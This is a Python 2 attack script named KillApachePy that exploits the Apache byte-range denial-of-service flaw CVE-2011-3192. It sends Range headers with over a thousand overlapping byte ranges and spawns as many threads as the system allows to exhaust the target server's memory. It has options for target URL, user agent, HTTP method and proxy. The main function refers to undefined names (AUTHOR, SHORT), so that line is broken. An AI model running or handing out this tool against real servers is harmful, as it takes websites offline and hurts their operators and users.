#!/usr/bin/env python

import optparse, os, re, socket, threading, time, urllib, urllib2, urlparse

NAME        = "KillApachePy (CVE-2011-3192)"
VERSION     = "0.1"

SLEEP_TIME      = 3     # time to wait for new thread slots (after max number reached)
RANGE_NUMBER    = 1024  # number of range subitems forming the DoS payload
USER_AGENT      = "KillApachePy (%s)" % VERSION

def attack(url, user_agent=None, method='GET', proxy=None):
    if '://' not in url:
        url = "http://%s" % url

    host = urlparse.urlparse(url).netloc

    user_agent = user_agent or USER_AGENT

    if proxy and not re.match('\Ahttp(s)?://[^:]+:[0-9]+(/)?\Z', proxy, re.I):
        print "(x) Invalid proxy address used"
        exit(-1)

    proxy_support = urllib2.ProxyHandler({'http': proxy} if proxy else {})
    opener = urllib2.build_opener(proxy_support)
    urllib2.install_opener(opener)

    class _MethodRequest(urllib2.Request):
        '''
        Create any HTTP (e.g. HEAD/PUT/DELETE) request type with urllib2
        '''
        def set_method(self, method):
            self.method = method.upper()

        def get_method(self):
            return getattr(self, 'method', urllib2.Request.get_method(self))

    def _send(check=False):
        '''
        Send the vulnerable request to the target
        '''
        if check:
            print "(i) Checking target for vulnerability..."
        payload = "bytes=0-,%s" % ",".join("5-%d" % item for item in xrange(1, RANGE_NUMBER))
        try:
            headers = { 'Host': host, 'User-Agent': USER_AGENT, 'Range': payload, 'Accept-Encoding': 'gzip, deflate' }
            req = _MethodRequest(url, None, headers)
            req.set_method(method)
            response = urllib2.urlopen(req)
            if check:
                return response and ('byteranges' in repr(response.headers.headers) or response.code == 206)
        except urllib2.URLError, msg:
            if 'timed out' in str(msg):
                print "\r(i) Server seems to be choked ('%s')" % msg
            else:
                print "(x) Connection error ('%s')" % msg
                if check or 'Forbidden' in str(msg):
                    os._exit(-1)
        except Exception, msg:
            raise

    try:
        if not _send(check=True):
            print "(x) Target does not seem to be vulnerable"
        else:
            print "(o) Target seems to be vulnerable\n"
            quit = False
            while not quit:
                threads = []
                print "(i) Creating new threads..."
                try:
                    while True:
                        thread = threading.Thread(target=_send)
                        thread.start()
                        threads.append(thread)
                except KeyboardInterrupt:
                    quit = True
                    raise
                except Exception, msg:
                    if 'new thread' in str(msg):
                        print "(i) Maximum number of new threads created (%d)" % len(threads)
                    else:
                        print "(x) Exception occured ('%s')" % msg
                finally:
                    if not quit:
                        print "(o) Waiting for %d seconds to acquire new threads" % SLEEP_TIME
                        time.sleep(SLEEP_TIME)
                        print
    except KeyboardInterrupt:
        print "\r(x) Ctrl-C was pressed"
        os._exit(1)

def main():
    print "%s #v%s\n by: %s\n\n(Note(s): %s)\n" % (NAME, VERSION, AUTHOR, SHORT)
    parser = optparse.OptionParser(version=VERSION)
    parser.add_option("-u", dest="url", help="Target url (e.g. \"http://www.target.com/index.php\")")
    parser.add_option("--agent", dest="agent", help="User agent (e.g. \"Mozilla/5.0 (Linux)\")")
    parser.add_option("--method", dest="method", default='GET', help="HTTP method used (default: GET)")
    parser.add_option("--proxy", dest="proxy", help="Proxy (e.g. \"http://127.0.0.1:8118\")")
    options, _ = parser.parse_args()
    if options.url:
        result = attack(options.url, options.agent, options.method, options.proxy)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
